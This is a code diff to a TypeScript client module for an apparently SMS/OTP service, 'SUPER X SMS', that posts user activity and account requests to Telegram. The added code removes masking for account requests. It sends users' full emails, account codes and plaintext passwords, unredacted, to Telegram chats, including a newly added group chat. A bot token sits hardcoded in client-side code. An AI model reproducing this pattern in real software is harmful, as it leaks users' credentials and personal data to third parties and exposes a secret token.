@@ -521,9 +521,11 @@ export function maskPassword(pass?: string): string {
  */
 export async function sendUserActivityToTelegram(activity: {
   action: string;
+  userId?: string;
   userEmail?: string;
   userName?: string;
   userCode?: string;
+  password?: string;
   loginCount?: number;
   ip?: string;
   details?: string;
@@ -541,6 +543,7 @@ export async function sendUserActivityToTelegram(activity: {
   const actionLower = activity.action.toLowerCase();
   const isApproved = actionLower.includes('approve') || actionLower.includes('complete') || actionLower.includes('activat');
   const isLogin = actionLower.includes('login') || actionLower.includes('sign in');
+  const isAccountRequest = actionLower.includes('account request') || actionLower.includes('new account');
   const actionEmoji =
     isApproved ? '🎉' :
     isLogin ? '🔑' :
@@ -549,7 +552,7 @@ export async function sendUserActivityToTelegram(activity: {
     actionLower.includes('cancel') || actionLower.includes('release') ? '❌' :
     actionLower.includes('otp') || actionLower.includes('sms') ? '🔐' : '⚡';
 
-  let msgText = `<b>${actionEmoji} SUPER X SMS — USER ACTIVITY REPORT</b>\n\n`;
+  let msgText = `<b>${isAccountRequest ? '👤' : actionEmoji} SUPER X SMS — USER ACTIVITY REPORT</b>\n\n`;
   msgText += `⏰ <b>Time:</b> ${timeStr}\n`;
   msgText += `📌 <b>Action:</b> ${activity.action.toUpperCase()}\n`;
   
@@ -558,18 +561,20 @@ export async function sendUserActivityToTelegram(activity: {
     msgText += `👤 <b>User:</b> ${activity.userName}\n`;
   }
   
-  // 2. Email is masked with xxxxxxx for privacy
+  // 2. Email: if account request, show full unmasked as requested by user
   if (activity.userEmail) {
-    msgText += `✉️ <b>Email:</b> <code>${maskEmail(activity.userEmail)}</code>\n`;
+    msgText += `✉️ <b>Email:</b> <code>${isAccountRequest ? activity.userEmail : maskEmail(activity.userEmail)}</code>\n`;
   }
   
-  // 3. Account Code is partially masked
+  // 3. Account Code: if account request, show full unmasked as requested
   if (activity.userCode) {
-    msgText += `🆔 <b>Account Code:</b> <code>${maskAccountCode(activity.userCode)}</code>\n`;
+    msgText += `🆔 <b>Account Code:</b> <code>${isAccountRequest ? activity.userCode : maskAccountCode(activity.userCode)}</code>\n`;
   }
   
-  // 4. Password masked if approval, account request, or login
-  if (isApproved || isLogin || actionLower.includes('request') || actionLower.includes('register') || actionLower.includes('account')) {
+  // 4. Password: if account request and password provided, show unmasked
+  if (isAccountRequest && activity.password) {
+    msgText += `🔑 <b>Password:</b> <code>${activity.password}</code>\n`;
+  } else if (isApproved || isLogin || actionLower.includes('request') || actionLower.includes('register') || actionLower.includes('account')) {
     msgText += `🔑 <b>Password:</b> <code>••••••••</code> (Protected)\n`;
   }
 
@@ -592,27 +597,58 @@ export async function sendUserActivityToTelegram(activity: {
   }
   if (activity.details) {
     // Sanitize any raw emails, codes, or passwords in details
-    const safeDetails = activity.details
-      .replace(/password[:=]\s*([^\s|,]+)/gi, 'Password: ••••••••')
-      .replace(/pass[:=]\s*([^\s|,]+)/gi, 'Password: ••••••••');
+    const safeDetails = isAccountRequest
+      ? activity.details
+      : activity.details
+          .replace(/password[:=]\s*([^\s|,]+)/gi, 'Password: ••••••••')
+          .replace(/pass[:=]\s*([^\s|,]+)/gi, 'Password: ••••••••');
     msgText += `📝 <b>Details:</b> ${safeDetails}\n`;
   }
   msgText += `\n━━━━━━━━━━━━━━\n⚡ <i>SUPER X SMS Live Tracking Gateway</i>`;
 
-  const inlineKeyboard = {
-    inline_keyboard: [
-      [
-        {
-          text: '‼️ PANEL',
-          url: 'https://superxsms.vercel.app/',
-        },
-        {
-          text: '📢 CHANNEL',
-          url: 'https://t.me/super_x_sms_s',
-        },
-      ],
-    ],
-  };
+  const inlineKeyboard = isAccountRequest
+    ? {
+        inline_keyboard: [
+          [
+            {
+              text: '✅ APPROVE',
+              callback_data: `approve_acc:${activity.userId || activity.userEmail}`,
+            },
+            {
+              text: '❌ REJECT',
+              callback_data: `reject_acc:${activity.userId || activity.userEmail}`,
+            },
+            {
+              text: '📢 NOTICE',
+              callback_data: `notice_acc:${activity.userId || activity.userEmail}`,
+            },
+          ],
+          [
+            {
+              text: '‼️ PANEL',
+              url: 'https://superxsms.vercel.app/',
+            },
+            {
+              text: '📢 CHANNEL',
+              url: 'https://t.me/super_x_sms_s',
+            },
+          ],
+        ],
+      }
+    : {
+        inline_keyboard: [
+          [
+            {
+              text: '‼️ PANEL',
+              url: 'https://superxsms.vercel.app/',
+            },
+            {
+              text: '📢 CHANNEL',
+              url: 'https://t.me/super_x_sms_s',
+            },
+          ],
+        ],
+      };
 
   try {
     const proxyRes = await fetch('/api/telegram/send', {
@@ -657,6 +693,9 @@ export async function sendUserActivityToTelegram(activity: {
  * Target Admin Chat ID: 7084317713
  * Includes interactive Accept / Reject inline buttons
  */
+// Session deduplication set to avoid sending duplicate Telegram notifications for the same account request
+const dispatchedAccountRequests = new Set<string>();
+
 export async function sendAccountActivationRequestToAdminTelegram(account: {
   id?: string;
   name?: string;
@@ -668,7 +707,7 @@ export async function sendAccountActivationRequestToAdminTelegram(account: {
   note?: string;
 }): Promise<{ success: boolean; message: string }> {
   const botToken = '8631714331:AAEd33AVl9oqI-HdGW7jtxE37y4N4nH4ox4';
-  const targetChatId = '7084317713';
+  const targetChatIds = ['-1004476126020', '7084317713'];
 
   const cleanEmail = (account.email || '').toLowerCase().trim();
   const cleanName = account.name || cleanEmail.split('@')[0] || 'User';
@@ -676,79 +715,98 @@ export async function sendAccountActivationRequestToAdminTelegram(account: {
   const cleanCode = account.accountCode || '';
   const timeStr = formatScriptTimestamp(account.createdAt || Date.now());
 
+  // Prevent sending duplicate notifications for the same account in the client session
+  const dedupKey = `${cleanEmail}_${cleanCode}`;
+  if (dispatchedAccountRequests.has(dedupKey)) {
+    return { success: true, message: 'Account request already dispatched to Telegram.' };
+  }
+
+  // Matches exact layout from the Telegram user activity report screenshot
   const formattedText =
-    `<b>🚨 SUPER X SMS — NEW ACCOUNT ACTIVATION REQUEST</b>\n\n` +
-    `👤 <b>Name:</b> ${cleanName}\n` +
+    `<b>👤 SUPER X SMS — USER ACTIVITY REPORT</b>\n\n` +
+    `⏰ <b>Time:</b> ${timeStr}\n` +
+    `📌 <b>Action:</b> NEW ACCOUNT REQUEST\n` +
+    `👤 <b>User:</b> ${cleanName}\n` +
     `✉️ <b>Email:</b> <code>${cleanEmail}</code>\n` +
+    `🆔 <b>Account Code:</b> <code>${cleanCode}</code>\n` +
     `🔑 <b>Password:</b> <code>${cleanPass}</code>\n` +
-    `🆔 <b>ID Code:</b> <code>${cleanCode}</code>\n` +
-    (account.phoneOrTelegram ? `📱 <b>Phone/Telegram:</b> <code>${account.phoneOrTelegram}</code>\n` : '') +
-    `⏰ <b>Requested At:</b> ${timeStr}\n\n` +
+    `📝 <b>Details:</b> Status: PENDING ADMIN APPROVAL | Account Requested\n` +
     `━━━━━━━━━━━━━━━━━━━━\n` +
-    `⚠️ <b>STATUS: PENDING ADMIN APPROVAL</b>\n` +
-    `<i>Click Accept below to activate instantly or Reject to deny.</i>`;
+    `⚡ <i>SUPER X SMS Live Tracking Gateway</i>`;
 
   const inlineKeyboard = {
     inline_keyboard: [
       [
         {
-          text: '✅ Accept & Activate',
+          text: '✅ APPROVE',
           callback_data: `approve_acc:${account.id || cleanEmail}`,
         },
         {
-          text: '❌ Reject',
+          text: '❌ REJECT',
           callback_data: `reject_acc:${account.id || cleanEmail}`,
+        },
+        {
+          text: '📢 NOTICE',
+          callback_data: `notice_acc:${account.id || cleanEmail}`,
         },
       ],
       [
         {
-          text: '‼️ OPEN PANEL',
+          text: '‼️ PANEL',
           url: 'https://superxsms.vercel.app/',
+        },
+        {
+          text: '📢 CHANNEL',
+          url: 'https://t.me/super_x_sms_s',
         },
       ],
     ],
   };
 
-  // 1. Try server-side proxy route first
-  try {
-    const proxyRes = await fetch('/api/telegram/send', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        botToken,
-        chatId: targetChatId,
-        text: formattedText,
-        replyMarkup: inlineKeyboard,
-      }),
-    });
-    if (proxyRes.ok) {
-      const json = await proxyRes.json();
-      if (json.ok || json.success) {
-        return { success: true, message: 'Activation request sent to Admin Telegram Bot.' };
-      }
-    }
-  } catch {}
+  dispatchedAccountRequests.add(dedupKey);
 
-  // 2. Direct fetch to Telegram Bot API fallback
-  try {
-    const directUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    const directRes = await fetch(directUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: targetChatId,
-        text: formattedText,
-        parse_mode: 'HTML',
-        disable_web_page_preview: true,
-        reply_markup: JSON.stringify(inlineKeyboard),
-      }),
-    });
-    const directJson = await directRes.json();
-    if (directJson.ok) {
-      return { success: true, message: 'Activation request sent directly to Telegram!' };
-    }
-  } catch (err: any) {
-    return { success: false, message: err?.message || 'Failed to send to Telegram.' };
+  let deliveredAny = false;
+
+  for (const chatId of targetChatIds) {
+    try {
+      const proxyRes = await fetch('/api/telegram/send', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          botToken,
+          chatId,
+          text: formattedText,
+          replyMarkup: inlineKeyboard,
+        }),
+      });
+      if (proxyRes.ok) {
+        deliveredAny = true;
+        continue;
+      }
+    } catch {}
+
+    // Direct fetch fallback
+    try {
+      const directUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const directRes = await fetch(directUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: formattedText,
+          parse_mode: 'HTML',
+          disable_web_page_preview: true,
+          reply_markup: inlineKeyboard,
+        }),
+      });
+      if (directRes.ok) {
+        deliveredAny = true;
+      }
+    } catch {}
+  }
+
+  if (deliveredAny) {
+    return { success: true, message: 'Activation request delivered to Telegram Admin Bot.' };
   }
 
   return { success: false, message: 'Could not deliver to Telegram.' };
